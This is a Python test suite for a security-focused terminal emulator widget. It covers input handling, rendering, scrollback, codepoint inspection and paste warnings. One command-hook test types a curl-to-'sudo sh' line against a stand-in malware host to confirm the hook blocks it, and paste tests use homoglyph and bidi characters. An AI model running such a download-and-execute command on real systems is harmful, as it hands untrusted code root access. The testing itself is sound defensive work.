#!/usr/bin/python3 -Bsu

## Copyright (C) 2026 - 2026 ENCRYPTED SUPPORT LLC <adrelanos@whonix.org>
## See the file COPYING for copying conditions.

## AI-Assisted

"""
Offscreen widget/window tests for secure-terminal: the behaviour that lives in
the Qt layer (terminal.py / main.py / dialog.py) rather than the pure core.
Needs PyQt6 (offscreen) and python3-pyte. These are declared dependencies of the
test (the CI container installs them), so a missing one is a hard FAILURE, not a
skip -- a security-relevant test must never be silently disabled. Exit 0 on full
pass, 1 on any failure or missing dependency.
"""

import os
import sys
import signal
import tempfile

os.environ.setdefault('QT_QPA_PLATFORM', 'offscreen')
os.environ['XDG_CONFIG_HOME'] = tempfile.mkdtemp(prefix='st-widget-cfg-')
# Isolate session state too, or a real leftover session on the box would be
# restored and make the window's initial mode/tabs nondeterministic.
os.environ['XDG_STATE_HOME'] = tempfile.mkdtemp(prefix='st-widget-state-')
try:
    signal.signal(signal.SIGCHLD, signal.SIG_IGN)
except (OSError, ValueError, AttributeError):
    pass

try:
    from PyQt6.QtWidgets import QApplication, QInputDialog
    from PyQt6.QtGui import QKeyEvent, QColor
    from PyQt6.QtCore import QEvent, Qt, QTimer, QEventLoop, QMimeData
    from secure_terminal.terminal import SecureTerminal, tui_available
    from secure_terminal import dialog as st_dialog
except Exception as exc:  # pylint: disable=broad-except
    # Fail closed: a missing test dependency (PyQt6, pyte, the module) must not
    # be silently skipped.
    sys.stderr.write('secure-terminal-tests(widget): FAIL missing dependency: '
                     '%s\n' % exc)
    sys.exit(1)

APP = QApplication.instance() or QApplication([])
PASS = 0
FAIL = 0


def ok(cond, msg):
    global PASS, FAIL
    if cond:
        PASS += 1
    else:
        FAIL += 1
        sys.stderr.write('FAIL: ' + msg + '\n')


def eq(got, want, msg):
    ok(got == want, '%s -> %r, want %r' % (msg, got, want))


def pump(ms):
    loop = QEventLoop()
    QTimer.singleShot(ms, loop.quit)
    loop.exec()


def key(term, qtkey, text='', mods=Qt.KeyboardModifier.NoModifier):
    term.keyPressEvent(QKeyEvent(QEvent.Type.KeyPress, qtkey, mods, text))


def spy_writes(term):
    sent = []
    term._write = sent.append          # pylint: disable=protected-access
    return sent


# --- line-mode key forwarding -------------------------------------------------
t = SecureTerminal(command='/bin/cat')
sent = spy_writes(t)
key(t, Qt.Key.Key_A, 'a')
key(t, Qt.Key.Key_Return)
key(t, Qt.Key.Key_Backspace)
key(t, Qt.Key.Key_Tab)
eq(sent, [b'a', b'\r', b'\x7f', b'\t'], 'line keys forwarded')
sent.clear()
key(t, Qt.Key.Key_D, '', Qt.KeyboardModifier.ControlModifier)   # Ctrl+D EOF
key(t, Qt.Key.Key_L, '', Qt.KeyboardModifier.ControlModifier)   # Ctrl+L clear
eq(sent, [b'\x04', b'\x0c'], 'ctrl D/L are bytes')
sent.clear()
# Ctrl+<letter> sends its control byte, like a real terminal: cooked mode turns
# 0x03 into SIGINT, a raw-mode app reads the byte itself (readline Ctrl+A/R, an
# app's own "press Ctrl+C again to exit"). Ctrl+backslash -> 0x1c (SIGQUIT).
key(t, Qt.Key.Key_C, '', Qt.KeyboardModifier.ControlModifier)
key(t, Qt.Key.Key_A, '', Qt.KeyboardModifier.ControlModifier)
key(t, Qt.Key.Key_R, '', Qt.KeyboardModifier.ControlModifier)
key(t, Qt.Key.Key_Backslash, '', Qt.KeyboardModifier.ControlModifier)
eq(sent, [b'\x03', b'\x01', b'\x12', b'\x1c'], 'ctrl+key sends its control byte')
# printable non-ASCII is a deliberate keystroke -> sent UTF-8 (euro, e-acute)
sent.clear()
key(t, Qt.Key.Key_unknown, chr(0x20AC))       # euro sign
key(t, Qt.Key.Key_unknown, chr(0x00E9))       # e-acute
eq(sent, [chr(0x20AC).encode('utf-8'), chr(0x00E9).encode('utf-8')],
   'printable unicode input sent as utf-8')
# a non-printable keystroke (bidi override) is still dropped
sent.clear()
key(t, Qt.Key.Key_unknown, chr(0x202E))       # RLO bidi override
eq(sent, [], 'non-printable (bidi) input dropped')

# --- _append: backspace erase, CRLF, overwrite, line-local --------------------
a = SecureTerminal(command='/bin/cat')
a._append('abc')
a._append('\x08 \x08')                 # readline erase
eq(a.toPlainText().rstrip(), 'ab', 'backspace erase')
b = SecureTerminal(command='/bin/cat')
b._append('l1\r\nl2\r\n')
eq(b.toPlainText(), 'l1\nl2\n', 'CRLF collapsed')
c = SecureTerminal(command='/bin/cat')
c._append('123456')
c._append('\rAB')
eq(c.toPlainText(), 'AB3456', 'bare CR overwrite')
d = SecureTerminal(command='/bin/cat')
d._append('first\nsecond')
d._append('\rX')
eq(d.toPlainText(), 'first\nXecond', 'CR line-local')
# multi-backspace: five readline erases delete five chars (persistent cursor)
mb = SecureTerminal(command='/bin/cat')
mb._append('fffff')
for _ in range(5):
    mb._append('\x08 \x08')
eq(mb.toPlainText().rstrip(), '', 'five backspaces erase five chars')
# a write lands where a program left the cursor mid-line (zsh prompt + fill),
# not at end-of-document -- the wall-of-spaces-before-input bug
pc = SecureTerminal(command='/bin/cat')
pc._append('P% ')            # prompt
pc._append(' ' * 8)           # trailing fill beyond the cursor
pc._append('\r')              # carriage return -> column 0
pc._append('P% ')             # redraw the prompt over the fill
pc._append('x')               # the echo must land right after the prompt
ok(pc.toPlainText().startswith('P% x'), 'write lands at the persistent cursor')
# backspace over a reveal badge deletes the whole character in the WIDGET (#119):
# the badge is 8 display columns but one logical cell.
bb = SecureTerminal(command='/bin/cat')
bb.apply_mode('reveal')
bb._append('echo ' + chr(0x20AC))
ok(bb.toPlainText().endswith('<U+20AC>'), 'widget shows the reveal badge')
bb._append('\b\x1b[K')                 # readline backspace: one cell + erase-EOL
ok(bb.toPlainText().endswith('echo ') and '<U+' not in bb.toPlainText(),
   'backspace removes the whole badge in the widget (#119)')
# a plain click must not strand the blinking caret where you cannot type: input
# always goes to the shell at the output cursor, so mouseReleaseEvent snaps the
# caret back unless a drag made a selection (which is kept, for copy).
from PyQt6.QtGui import QMouseEvent, QTextCursor      # noqa: E402
from PyQt6.QtCore import QPointF                       # noqa: E402
cs = SecureTerminal(command='/bin/cat')
cs._append('prompt> ')
_out = cs._out_cursor.position()
_stray = QTextCursor(cs.document())
_stray.setPosition(2)                                  # as if a click landed here
cs.setTextCursor(_stray)
_release = QMouseEvent(QEvent.Type.MouseButtonRelease, QPointF(1, 1), QPointF(1, 1),
                       Qt.MouseButton.LeftButton, Qt.MouseButton.NoButton,
                       Qt.KeyboardModifier.NoModifier)
cs.mouseReleaseEvent(_release)
eq(cs.textCursor().position(), _out, 'plain click snaps the caret back to output')
# a selection (drag) survives the release, so copy still works
_sel = QTextCursor(cs.document())
_sel.setPosition(0)
_sel.setPosition(4, QTextCursor.MoveMode.KeepAnchor)
cs.setTextCursor(_sel)
cs.mouseReleaseEvent(_release)
ok(cs.textCursor().hasSelection(), 'a drag selection survives the release')
# scrollback navigation in line mode: PageUp scrolls the buffer up, Shift+Home/
# End jump to the ends, plain Home is left for line editing (does not scroll)
sc = SecureTerminal(command='/bin/cat')
sc.resize(600, 200)
sc.show()
for _i in range(200):
    sc._append('line %d\n' % _i)
_bar = sc.verticalScrollBar()
_bottom = _bar.value()
key(sc, Qt.Key.Key_PageUp)
ok(_bar.value() < _bottom, 'PageUp scrolls the scrollback up')
key(sc, Qt.Key.Key_End, mods=Qt.KeyboardModifier.ShiftModifier)
eq(_bar.value(), _bar.maximum(), 'Shift+End jumps to the bottom')
key(sc, Qt.Key.Key_Home, mods=Qt.KeyboardModifier.ShiftModifier)
eq(_bar.value(), _bar.minimum(), 'Shift+Home jumps to the top')
_bar.setValue(50)
key(sc, Qt.Key.Key_Home)
eq(_bar.value(), 50, 'plain Home does not scroll (reserved for editing)')
# flood must not hang: a large control-laden blob (every byte 0x00-0xff, so it
# carries CR/BS/NL) renders in bounded time and bounded document size. This is
# the "cat /dev/random freeze" regression -- the old per-char cursor path took
# minutes; the bulk path is seconds.
import time as _time                                  # noqa: E402
from secure_terminal import sanitize as _S            # noqa: E402
fl = SecureTerminal(command='/bin/cat')
fl.resize(600, 300)
_blob = _S.render_output((bytes(range(256)) * 8000).decode('latin-1'), 'strip')
_t0 = _time.time()
for _ in range(2):                                    # ~4MB of control-laden output
    fl._append(_blob)
_elapsed = _time.time() - _t0
ok(_elapsed < 30, 'control-laden flood renders in bounded time (%.1fs)' % _elapsed)
ok(fl.document().blockCount() <= 10000,
   'flood document stays bounded (%d blocks)' % fl.document().blockCount())
# keyboard tab navigation: the widget emits tab_step / tab_move so the window can
# switch or reorder tabs (Ctrl+PageUp/Down and the Shift variants)
nav = SecureTerminal(command='/bin/cat')
_steps, _moves = [], []
nav.tab_step.connect(_steps.append)
nav.tab_move.connect(_moves.append)
key(nav, Qt.Key.Key_PageDown, mods=Qt.KeyboardModifier.ControlModifier)
key(nav, Qt.Key.Key_PageUp,
    mods=Qt.KeyboardModifier.ControlModifier | Qt.KeyboardModifier.ShiftModifier)
eq((_steps, _moves), ([1], [-1]),
   'Ctrl+PageDown steps tab, Ctrl+Shift+PageUp moves tab')
# a display-mode toggle re-renders the WHOLE existing buffer, not only new output
rr = SecureTerminal(command='/bin/cat')
_rr_raw = 'cafe' + chr(0x00E9) + '\n'
rr._raw = _rr_raw
rr._append(_S.render_output(_rr_raw, 'strip'))
eq(rr.toPlainText().rstrip(), 'cafe_', 'strip shows non-ascii as _')
rr.apply_mode('reveal')
eq(rr.toPlainText().rstrip(), 'cafe<U+00E9>', 'reveal re-renders existing scrollback')
rr.apply_mode('show')
eq(rr.toPlainText().rstrip(), 'cafe' + chr(0x00E9), 'show re-renders existing scrollback')
rr.apply_mode('strip')
eq(rr.toPlainText().rstrip(), 'cafe_', 'strip re-renders the scrollback back')
# a mode toggle after a flood re-renders only the recent tail, not the full
# scrollback: reveal expands each byte to an 8-char <U+XXXX>, so re-rendering 1MB
# of raw would be ~8MB and freeze the UI. Bounded, the document stays small.
rf = SecureTerminal(command='/bin/cat')
rf._raw = (b''.join(bytes([i % 256]) for i in range(1000)) * 1000).decode('latin-1')
rf.apply_mode('reveal')
ok(len(rf.toPlainText()) < 1_200_000,
   'mode toggle re-renders only the bounded tail, not the whole 8MB expansion')
# regression: switching CLI<->TUI at a shell prompt must NOT blank the scrollback.
# TUI only takes over the screen while a full-screen program is on the alt screen;
# with just a shell it stays in line display, so toggling is a visual no-op and
# the history survives. (Fixed a bug where apply_tui() rendered a blank pyte grid
# over the scrollback the moment TUI was enabled.)
sw = SecureTerminal(command='/bin/cat')
_scroll = 'history-line-A\nhistory-line-B\nhistory-line-C\n'
sw._raw = _scroll
sw._append(_S.render_output(_scroll, 'strip'))
ok('history-line-A' in sw.toPlainText() and 'history-line-C' in sw.toPlainText(),
   'scrollback present in CLI mode')
sw.apply_tui(True)
ok('history-line-A' in sw.toPlainText(),
   'CLI->TUI at a shell prompt keeps the scrollback (not blanked)')
sw.apply_tui(False)
ok('history-line-A' in sw.toPlainText(), 'TUI->CLI keeps the scrollback')
for _ in range(5):
    sw.apply_tui(True)
    sw.apply_tui(False)
ok('history-line-A' in sw.toPlainText() and 'history-line-C' in sw.toPlainText(),
   'repeated CLI<->TUI toggling preserves the scrollback (solid)')
# and when a full-screen program DOES take the grid then exits, the scrolling
# document is rebuilt from retained output (only runs where pyte is installed).
sw.apply_tui(True)
if sw.current_tui():
    sw._alt_screen = True
    sw._sync_display()                      # a full-screen program takes the grid
    sw._alt_screen = False
    sw._sync_display()                      # it exits -> scrollback rebuilt
    ok('history-line-A' in sw.toPlainText(),
       'scrollback restored after a full-screen program exits')
sw.apply_tui(False)
# CLI->TUI grid fits the viewport: no useless horizontal scrollbar and no clipped
# right edge. The grid is sized to the text AREA (viewport minus the doc margins),
# not the raw viewport, which used to give one column too many and overflow.
gz = SecureTerminal(command='/bin/cat')
gz.resize(820, 400)
gz.show()
pump(40)
ok(gz.horizontalScrollBarPolicy() == Qt.ScrollBarPolicy.ScrollBarAlwaysOff,
   'the terminal never shows a horizontal scrollbar (line mode wraps, grid fits)')
_gcols, _grows = gz._tui_grid_size()
_gcw = gz.fontMetrics().horizontalAdvance('M') or 1
_gmargin = int(gz.document().documentMargin())
_gvbar = gz.verticalScrollBar().width() if gz.verticalScrollBar().isVisible() else 0
ok(_gcols * _gcw <= gz.viewport().width() - 2 * _gmargin + _gvbar,
   'the TUI grid columns fit the text area, so the grid never overflows sideways')
# --- TUI is a full emulator: primary-screen redraws (completion menus), CLI<->TUI
# scrollback, and full-screen apps all render (only where pyte is installed) ------
if tui_available():
    # a completion-menu style cursor-up redraw OVERWRITES the listing line instead
    # of piling up (the whole point of #184: the grid honours cursor-up)
    _mprog = os.path.join(tempfile.mkdtemp(prefix='st-menu-'), 'menu.sh')
    with open(_mprog, 'w') as _f:
        _f.write('#!/bin/sh\n'
                 'printf "prompt> cd \\n"\n'
                 'printf "dirA  dirB\\n"\n'
                 'printf "\\033[Aprompt> cd dirA\\033[K\\n"\n'   # cursor up + redraw
                 'sleep 3\n')
    os.chmod(_mprog, 0o755)
    _mt = SecureTerminal(command=_mprog, tui=True)
    _mt.resize(600, 300)
    _mt.show()
    pump(400)
    _mlines = [ln.rstrip() for ln in _mt.toPlainText().split('\n') if ln.strip()]
    ok('prompt> cd dirA' in _mlines and 'dirA  dirB' not in _mlines,
       'a cursor-up redraw (completion menu) overwrites in the grid, not piles up')
    # CLI->TUI keeps the scrollback (seeded from retained output), and TUI->CLI
    # keeps the output produced while in TUI
    _hprog = os.path.join(tempfile.mkdtemp(prefix='st-hist-'), 'h.sh')
    with open(_hprog, 'w') as _f:
        _f.write('#!/bin/sh\nfor i in 1 2 3 4 5; do echo "scrollback-$i"; done\nsleep 3\n')
    os.chmod(_hprog, 0o755)
    _ht = SecureTerminal(command=_hprog)          # start in CLI
    _ht.resize(600, 300)
    _ht.show()
    pump(400)
    ok('scrollback-3' in _ht.toPlainText(), 'output present in CLI mode')
    _ht.apply_tui(True)
    pump(120)
    ok('scrollback-3' in _ht.toPlainText(),
       'CLI->TUI keeps the scrollback (grid seeded from retained output)')
    # a full-screen program (alternate screen) is restored on exit: its frame does
    # not pollute the scrollback and the pre-program screen comes back
    _fprog = os.path.join(tempfile.mkdtemp(prefix='st-fs-'), 'fs.sh')
    with open(_fprog, 'w') as _f:
        _f.write('#!/bin/sh\n'
                 'echo primary-content\n'
                 'sleep 0.3\n'
                 'printf "\\033[?1049h\\033[2J\\033[HFULLSCREEN-FRAME"\n'
                 'sleep 0.4\n'
                 'printf "\\033[?1049l"\n'
                 'sleep 3\n')
    os.chmod(_fprog, 0o755)
    _ft = SecureTerminal(command=_fprog, tui=True)
    _ft.resize(600, 300)
    _ft.show()
    pump(1100)
    _ftext = _ft.toPlainText()
    ok('FULLSCREEN-FRAME' not in _ftext,
       'a full-screen program frame does not pollute the scrollback on exit')
    ok('primary-content' in _ftext,
       'the pre-program primary screen is restored when a full-screen app exits')
    # a tab that STARTS in TUI with restored scrollback keeps it, sets grid state,
    # and rebuilds the line document when switched to CLI (codex P1).
    _st = SecureTerminal(command='/bin/cat', tui=True, history='restored-scrollback\n')
    _st.resize(600, 300)
    _st.show()
    pump(120)
    ok(_st._grid_shown and 'restored-scrollback' in _st.toPlainText(),
       'a tab starting in TUI seeds its restored scrollback into the grid')
    _st.apply_tui(False)
    pump(60)
    ok('restored-scrollback' in _st.toPlainText(),
       'switching a TUI-started tab to CLI rebuilds the line document (keeps history)')
    # the shell's prompt that arrives in the SAME read as the alt-screen leave is
    # fed onto the restored primary, not discarded (codex P1).
    _pprog = os.path.join(tempfile.mkdtemp(prefix='st-lp-'), 'lp.sh')
    with open(_pprog, 'w') as _f:
        _f.write('#!/bin/sh\n'
                 'sleep 0.2\n'
                 'printf "\\033[?1049h\\033[2J\\033[HAPP"\n'
                 'sleep 0.3\n'
                 'printf "\\033[?1049lPROMPT-AFTER-LEAVE\\$ "\n'
                 'sleep 3\n')
    os.chmod(_pprog, 0o755)
    _pt = SecureTerminal(command=_pprog, tui=True)
    _pt.resize(600, 300)
    _pt.show()
    pump(900)
    ok('PROMPT-AFTER-LEAVE' in _pt.toPlainText(),
       'bytes after an alt-screen leave (the next prompt) land on the restored screen')
    # a scrollback cap smaller than the grid must not wipe the document (codex P2:
    # _grid_rows tracks ACTUAL blocks, so _delete_grid never goes negative).
    _tt = SecureTerminal(command='/bin/cat', tui=True)
    _tt.apply_scrollback(5)                # far smaller than the grid's row count
    _tt.resize(600, 400)
    _tt.show()
    pump(60)
    for _i in range(30):
        _tt._feed_stream(('grid-line-%d\r\n' % _i).encode())
    _tt._render_tui()                      # must not crash or blank the document
    ok(_tt.document().blockCount() >= 1 and _tt._grid_rows <= _tt.document().blockCount(),
       'a tiny scrollback cap does not corrupt the grid render')
    # the alt-screen split loop in _feed_stream always terminates: each iteration
    # advances past a marker (>= 6 bytes) or to the end -- feed pathological input
    # (back-to-back and empty-segment markers) and it must not hang or crash.
    _at = SecureTerminal(command='/bin/cat', tui=True)
    _at.resize(400, 200)
    _mk = [b'\x1b[?1049h', b'\x1b[?1049l', b'\x1b[?47h', b'\x1b[?47l']
    for _combo in (b''.join(_mk), b''.join(_mk * 3), b'x' + b''.join(_mk) + b'y',
                   b'\x1b[?1049h\x1b[?1049h\x1b[?1049l', b'', b'\x1b[?10', b'49h'):
        _at._feed_stream(_combo)          # returns (bounded) or the test would hang
    _at._render_tui()
    ok(_at.document().blockCount() >= 1,
       'the alt-screen split feed loop terminates on pathological marker input')
    # window resize keeps the pyte grid and the pty winsize in step (SIGWINCH), so
    # a TUI program repaints at the new width, and resizing while scrolled up does
    # not crash the incremental renderer.
    import fcntl as _fcntl, termios as _termios, struct as _struct     # noqa: E402
    _rt = SecureTerminal(command='/bin/cat', tui=True)
    _rt.resize(500, 300)
    _rt.show()
    pump(60)
    _small = _rt._screen.columns
    _rt.resize(1100, 600)
    pump(60)
    _grown = _rt._screen.columns
    _ws = _struct.unpack('HHHH', _fcntl.ioctl(
        _rt._fd, _termios.TIOCGWINSZ, _struct.pack('HHHH', 0, 0, 0, 0)))
    ok(_grown > _small and _ws[1] == _grown,
       'resize grows the pyte grid and updates the pty winsize (cols) together')
    for _i in range(200):
        _rt._feed_stream(('rsb-%d\r\n' % _i).encode())
    _rt._render_tui()
    _rbar = _rt.verticalScrollBar()
    _rbar.setValue(_rbar.maximum() // 2)
    _rt.resize(700, 450)               # resize while scrolled up: must not crash
    pump(40)
    ok(_rt.document().blockCount() >= 1, 'resizing while scrolled up does not crash')
# Ctrl+C is echoed locally as ^C (transparency: make the invisible visible) and
# de-duped against a shell that also echoes it (bash's readline), so the user
# always sees exactly one ^C.
cc = SecureTerminal(command='/bin/cat')
cc._feed_line('prompt$ ')
key(cc, Qt.Key.Key_C, mods=Qt.KeyboardModifier.ControlModifier)
ok(cc.toPlainText().endswith('^C'), 'Ctrl+C is locally echoed as ^C')
_dedup = cc._absorb_caret('^C\r\nprompt$ ')          # bash's own ^C, right after
ok(not _dedup.startswith('^C'), 'a shell duplicate ^C in the next output is absorbed')
cc._feed_line(_S.render_output(_dedup, cc.current_mode()))
eq(cc.toPlainText().count('^C'), 1, 'exactly one ^C after Ctrl+C + shell echo (no double)')
cz = SecureTerminal(command='/bin/cat')
cz._feed_line('prompt%')
key(cz, Qt.Key.Key_C, mods=Qt.KeyboardModifier.ControlModifier)
_z = cz._absorb_caret('\r\nprompt%')                 # a shell (zsh) that echoes nothing
ok('^C' not in _z, 'nothing removed when the shell does not echo ^C')
eq(cz.toPlainText().count('^C'), 1, 'local ^C preserved for a non-echoing shell')
# regression: output that fills the reported width hard-wraps (real autowrap), so
# a shell's width-padded end-of-line marker (zsh PROMPT_SP / PROMPT_EOL_MARK) and
# the following prompt do not collapse onto one logical line -- which lost the
# last line of a file printed without a trailing newline.
aw = SecureTerminal(command='/bin/cat')
aw._cols = 40
aw._feed_line('END}' + '%' * 40 + '\rprompt$ ')      # }, a width-filling marker, CR, prompt
_awlines = aw.toPlainText().split('\n')
ok(any('END}' in ln for ln in _awlines),
   'content before a width-filling marker survives (autowrap, not collapse)')
ok(len(_awlines) >= 2,
   'output filling the reported width hard-wraps instead of collapsing under a bare CR')
# and a soft-autowrapped line copies JOINED (no spurious newline at the wrap),
# like a real terminal -- the wrap-continuation block is marked and joined.
cwp = SecureTerminal(command='/bin/cat')
cwp._cols = 5
cwp._feed_line('abcdefgh\n')                          # 8 chars at width 5 -> wraps
cwp.selectAll()
_copied = cwp.createMimeDataFromSelection().text()
ok('abcdefgh' in _copied, 'a soft-wrapped line copies joined (no wrap newline)')
ok('abcde\nfgh' not in _copied, 'the wrap point is not a newline in the copy')
# copying a slice that starts AFTER an astral char must land on the right cell:
# QTextCursor positions are UTF-16 units (an astral glyph is two), so a Python
# str-offset slice would mis-cut. Show mode keeps the glyph as one code point.
cap = SecureTerminal(command='/bin/cat')
cap.apply_mode('show')
cap._feed_line('\U0001f600X\n')                      # emoji (2 UTF-16 units) + X
_capcur = cap.textCursor()
_capcur.setPosition(2)                                # just past the emoji
_capcur.setPosition(3, QTextCursor.MoveMode.KeepAnchor)
cap.setTextCursor(_capcur)
ok(cap.createMimeDataFromSelection().text() == 'X',
   'a selection after an astral char copies the right cell (UTF-16 aware)')
# --- inspect popups: a marked character carries its source codepoint, so the
# hover tooltip and the double-click popup can describe it in EVERY mode ---------
from secure_terminal.terminal import _CP_PROP            # noqa: E402
from PyQt6.QtWidgets import QLabel, QPushButton           # noqa: E402
from PyQt6.QtGui import QGuiApplication                   # noqa: E402


def _fmt_cp(term, index):
    _c = QTextCursor(term.document())
    _c.setPosition(index)
    _c.movePosition(QTextCursor.MoveOperation.NextCharacter,
                    QTextCursor.MoveMode.KeepAnchor)
    return _c.charFormat().property(_CP_PROP)


ins = SecureTerminal(command='/bin/cat')
ins.apply_mode('strip')
ins._append('a' + chr(0x202E) + 'b')                     # RLO between two ASCII
eq(ins.toPlainText(), 'a_b', 'strip shows the RLO override as "_"')
eq(_fmt_cp(ins, 1), 0x202E, 'even the strip "_" carries the source codepoint (RLO)')
inr = SecureTerminal(command='/bin/cat')
inr.apply_mode('reveal')
inr._append(chr(0x20AC))                                 # euro sign
eq(_fmt_cp(inr, 0), 0x20AC, 'a reveal badge carries the source codepoint (euro)')
# _cp_at (the real hover/click hit-test) recovers it from a viewport point. The
# badge is 8 cells wide and every cell carries the tag, so a mid-badge point is a
# stable target regardless of exact glyph metrics.
inr.resize(600, 200)
inr.show()
pump(30)
_mid = QTextCursor(inr.document())
_mid.setPosition(4)                                      # inside "<U+20AC>"
_badge_pt = inr.cursorRect(_mid).center()
eq(inr._cp_at(_badge_pt), 0x20AC, '_cp_at recovers the codepoint under a point (reveal)')
# and in SHOW mode a readable glyph keeps no tag but IS its own codepoint: _cp_at
# falls back to the character itself (three copies give a stable mid target).
insh = SecureTerminal(command='/bin/cat')
insh.apply_mode('show')
insh._append(chr(0x0416) * 3)                            # Cyrillic Zhe, printable
insh.resize(600, 200)
insh.show()
pump(30)
_shcur = QTextCursor(insh.document())
_shcur.setPosition(1)
eq(insh._cp_at(insh.cursorRect(_shcur).center()), 0x0416,
   '_cp_at reads a shown glyph via its own codepoint (show mode, no tag)')
# markings off + ANSI colours on: the marking keeps the program's own foreground
# (not dropped to a blank format) and still carries the codepoint (codex P2 fix).
from PyQt6.QtCore import QPoint                           # noqa: E402
_sgrk = tuple(sorted({'fg': 1, 'bg': None, 'bold': False}.items()))
_mfmt = SecureTerminal(command='/bin/cat')._fmt_from_key((_S.MARK_KEY, _sgrk, 0x202E))
eq(_mfmt.foreground().color().name(), '#cd0000',
   'markings off + colours on keeps the program ANSI colour on the marking')
eq(_mfmt.property(_CP_PROP), 0x202E, 'and the marking still carries the codepoint')
# the hit-test targets ONLY the character under the point, never its neighbour: a
# point over "_" reads the RLO, a point over the adjacent ASCII reads nothing
# (codex P2: probing both sides bled the popup into adjacent glyphs).
inb = SecureTerminal(command='/bin/cat')
inb.apply_mode('strip')
inb._append('a' + chr(0x202E) + 'b')                     # -> 'a_b'
inb.resize(600, 200)
inb.show()
pump(30)


def _midpt(term, i):
    _c0 = QTextCursor(term.document())
    _c0.setPosition(i)
    _c1 = QTextCursor(term.document())
    _c1.setPosition(i + 1)
    _r0 = term.cursorRect(_c0)
    _r1 = term.cursorRect(_c1)
    return QPoint((_r0.x() + _r1.x()) // 2, _r0.center().y())


eq(inb._cp_at(_midpt(inb, 1)), 0x202E, 'a point over "_" reads the RLO codepoint')
ok(inb._cp_at(_midpt(inb, 0)) is None, 'a point over the adjacent "a" is not the marking')
ok(inb._cp_at(_midpt(inb, 2)) is None, 'a point over the adjacent "b" is not the marking')
# an astral glyph (2 UTF-16 units) in show mode is hit-tested as ONE character:
# the whole code point, never a lone surrogate half (codex P2 fix).
ina = SecureTerminal(command='/bin/cat')
ina.apply_mode('show')
ina._append('x' + chr(0x1F600) + 'y')                    # emoji between two ASCII
ina.resize(600, 200)
ina.show()
pump(30)
_ea = QTextCursor(ina.document())
_ea.setPosition(1)                                       # boundary before the emoji
_eb = QTextCursor(ina.document())
_eb.setPosition(3)                                       # boundary after its 2 units
_emid = QPoint((ina.cursorRect(_ea).x() + ina.cursorRect(_eb).x()) // 2,
               ina.cursorRect(_ea).center().y())
eq(ina._cp_at(_emid), 0x1F600, 'a whole astral glyph is recovered (not a lone surrogate)')
# the active popup describes the character and copies its ESCAPE (never the raw
# glyph -- putting a bidi override / homoglyph on the clipboard is the hazard).
ins._show_char_popup(0x202E, ins.mapToGlobal(ins.rect().center()))
eq(ins._char_popup.windowTitle(), 'Character U+202E', 'popup is titled by codepoint')
_lbl = ins._char_popup.findChild(QLabel)
ok('RIGHT-TO-LEFT OVERRIDE' in _lbl.text() and 'bidirectional' in _lbl.text(),
   'popup names the character and its risk class')
_copy = [b for b in ins._char_popup.findChildren(QPushButton)
         if b.text().startswith('Copy')][0]
_copy.click()
eq(QGuiApplication.clipboard().text(), '\\u202e',
   'copy puts the \\uXXXX escape (not the raw glyph) on the clipboard')
ins._char_popup.close()
# a double-click on a marking opens its popup; elsewhere it falls through
_dc = []
ins._show_char_popup = lambda cp, pt: _dc.append(cp)
ins._cp_at = lambda pos: 0x202E
_dbl = QMouseEvent(QEvent.Type.MouseButtonDblClick, QPointF(5, 5), QPointF(5, 5),
                   Qt.MouseButton.LeftButton, Qt.MouseButton.LeftButton,
                   Qt.KeyboardModifier.NoModifier)
ins.mouseDoubleClickEvent(_dbl)
eq(_dc, [0x202E], 'double-click on a marking opens its inspection popup')
# command hook: judge the typed line before Enter submits it. The terminal here
# runs /bin/cat, which only echoes -- no typed string is ever executed.
hk = SecureTerminal(command='/bin/cat')
_handler = [sys.executable, '-c',
            'import sys, json\n'
            'c = json.load(sys.stdin)["command"]\n'
            'print(json.dumps({"verdict": "block", "message": "no",'
            ' "suggestion": "ls"} if "sudo sh" in c else {"verdict": "allow"}))']
hk.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow',
               'transcript': 'none'})
_hsent = spy_writes(hk)
_hnotes = []
hk.hook_notice.connect(_hnotes.append)


def _htype(term, text):
    for _ch in text:
        key(term, Qt.Key.Key_A, _ch)


_htype(hk, 'ls')
key(hk, Qt.Key.Key_Return)
ok(b'\r' in _hsent, 'hook allows a safe command (Enter submits)')
_hsent.clear()
hk._hook_ask = lambda _c, _r: 'discard'          # decline the block dialog
_htype(hk, 'curl http://malware.invalid | sudo sh')   # harmless illustration
key(hk, Qt.Key.Key_Return)
ok(b'\r' not in _hsent and b'\x15' in _hsent,
   'hook blocks: not submitted, typed line discarded (Ctrl+U)')
ok(_hnotes and _hnotes[-1] == 'no', 'hook advisory surfaced')
# history recall desyncs the hook's view of the line, so it must FAIL SAFE (ask),
# not judge a stale/empty buffer and wave a recalled command through.
_hsent.clear()
_asked = []
hk._hook_ask = lambda _c, _r: (_asked.append(_r['message']) or 'discard')
key(hk, Qt.Key.Key_Up)                 # recall from history -> buffer now stale
ok(hk._line_dirty, 'a history/edit key marks the line unverifiable for the hook')
key(hk, Qt.Key.Key_Return)
ok(_asked and b'\x15' in _hsent and b'\r' not in _hsent,
   'edited line: hook asks and (on decline) discards, never submits unjudged')
ok(not hk._line_dirty, 'dirty flag cleared after the decision')

# --- colours: SGR run formatting + contrast guard -----------------------------
from PyQt6.QtGui import QTextCursor as _QTC              # noqa: E402


def _fmt_of_char(term, ch):
    doc = term.toPlainText()
    idx = doc.index(ch)
    cur = term.textCursor()
    cur.setPosition(idx)
    cur.setPosition(idx + 1, _QTC.MoveMode.KeepAnchor)
    return cur.charFormat()


col = SecureTerminal(command='/bin/cat')
col.apply_colors(True)
col.apply_theme('dark')
col._append('\x1b[31mR\x1b[0m')          # red R via SGR, through the cell model
eq(_fmt_of_char(col, 'R').foreground().color().name(), '#cd0000', 'red run fg')
col2 = SecureTerminal(command='/bin/cat')
col2.apply_colors(True)
col2.apply_theme('dark')
col2._append('\x1b[30mH\x1b[0m')         # black-on-dark must be contrast-guarded
ok(_fmt_of_char(col2, 'H').foreground().color().name() != '#000000',
   'black-on-dark guarded')

# --- paste gating -------------------------------------------------------------
p = SecureTerminal(command='/bin/cat')
psent = spy_writes(p)
mime = QMimeData()
mime.setText('echo hi\n')
p.insertFromMimeData(mime)
eq(psent, [b'echo hi\r'], 'clean paste sent directly')
psent.clear()
# a paste with a homoglyph (Cyrillic a) plus a bidi override: three choices
mime2 = QMimeData()
mime2.setText('pay' + chr(0x0430) + 'l' + chr(0x202E) + '\n')
st_dialog.PasteWarningDialog.confirm = staticmethod(lambda *a, **k: 'reject')
p.insertFromMimeData(mime2)
eq(psent, [], 'rejected paste sends nothing')
st_dialog.PasteWarningDialog.confirm = staticmethod(lambda *a, **k: 'stripped')
p.insertFromMimeData(mime2)
